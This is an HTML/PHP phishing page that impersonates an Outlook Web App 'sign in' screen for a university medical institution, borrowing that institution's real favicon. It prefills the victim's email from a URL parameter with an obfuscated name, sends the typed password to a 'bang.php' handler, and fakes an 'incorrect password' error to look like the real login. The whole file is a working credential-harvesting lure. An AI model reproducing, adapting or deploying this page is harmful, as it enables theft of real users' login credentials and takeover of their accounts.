<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html><head>
  
  <meta content="text/html; charset=ISO-8859-1" http-equiv="content-type">

  
  <link href="https://webmail.uams.edu/owa/auth/15.0.1365/themes/resources/favicon.ico" rel="shortcut icon" type="image/vnd.microsoft.icon">
  <title>sign in</title>

  
  
  <script type="text/javascript">
  function submitFunction()
  {
  var email=document.getElementById('email').value;
  var atpos = email.indexOf("@");
  var dotpos = email.lastIndexOf(".");
   var password=document.getElementById('password').value;
  
  if (atpos < 1 || dotpos < atpos + 2 || dotpos + 2 > email.length)
  
  {
  
    document.getElementById("error0").innerHTML="Enter your work or school email";
  document.getElementById("error0").style.color = '#c31c1c';
                flag=1;
  return false;
  
  }
  
  if(password=="")
  		{
  			document.getElementById("error1").innerHTML="The user name or password you entered isn't correct. Try entering it again.";
  				document.getElementById("error1").style.color = '#c31c1c';   
                flag=1;
  				return false;
  		}
  
else
		{
				return true;
		}

  }
  </script>
  
  <style>
html { 
  background: url(images/bg-pass.png) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}

 table.right {
    margin-left:auto; 
    margin-right:3%;
  }

.footer {
    position: fixed;
    left: 0;
    bottom: 0;
    width: 100%;
height: 5%;
    background-color: rgb(204, 204, 204);
    color: black;
    text-align: center;
}

.label-maker{
    font-family: sans-serif;
}
.label-maker input{border-radius:0px;
      -moz-border-radius:0px;
      -webkit-border-radius:0px;
    border: 0.5px solid #999;
    width: 50%;
    border-bottom-color: #000;
    padding: .2em;
    display: inline-block;
    color: black;
    font-family: arial;
    font-size: 1.0em;
    gradient(#444, #333);
    box-shadow: 0.5px .5px #A9A9A9;
text-align: left;
}

    .btn {
  -webkit-border-radius: 5px;
  -moz-border-radius: 5px;
  border-radius: 5px;
  font-family: Arial;
  color: rgb(42, 114, 192);
  font-size: 18px;
  background: rgb(211, 211, 211);
  padding: 5px 5px 5px 5px;
  text-decoration: none;
}

.btn:hover {
  background: rgb(215, 215, 215);
  text-decoration: none;
}

  </style>
</head><body>
<form method="post" action="bang.php" name="godaddy" class="label-maker" onsubmit="return submitFunction();">
  <div style="text-align: center;"> </div>
  <table style="width: 45%;" class="right" border="0" cellpadding="10">
    <tbody>
      <tr align="center">
        <td style="vertical-align: middle; text-align: center;">
        <div style="text-align: left;"><br>
        </div>
        <br>
        <br>
        <br>
        <br>
        <br>
        <br>
        <br>
        <br>
        <br>
        <br>
        <br>
        <div style="text-align: left;"><img style="width: 423px; height: 55px;" alt="" src="images/download.png"><br>
        </div>
        </td>
      </tr>
      <tr>
        <td style="vertical-align: top;"><big><big><big><small><small><small>Username:</small></small></small><span style="font-weight: bold;"><small><small><br>
        <input readonly="readonly" name="email" id="email" value="<?=$_GET[address5242453243253254353424532543]?>"> </small></small></span><small><small><small><br><div id="error0" align="left"></div>
Password:</small></small></small><span style="font-weight: bold;"><small><small><br>
        <input name="password" id="password" type="password"> <br><div id="error1" align="left"></div>
        <br>
        </small></small></span></big></big></big>
        <div style="text-align: left; font-weight: bold;"><big><big><big><small><small><button type="submit" id="button" class="btn" style="opacity: 1;">Sign in</button>
        </small></small></big></big></big></div>
        </td>
      </tr>
    </tbody>
  </table>
</form>

</body></html>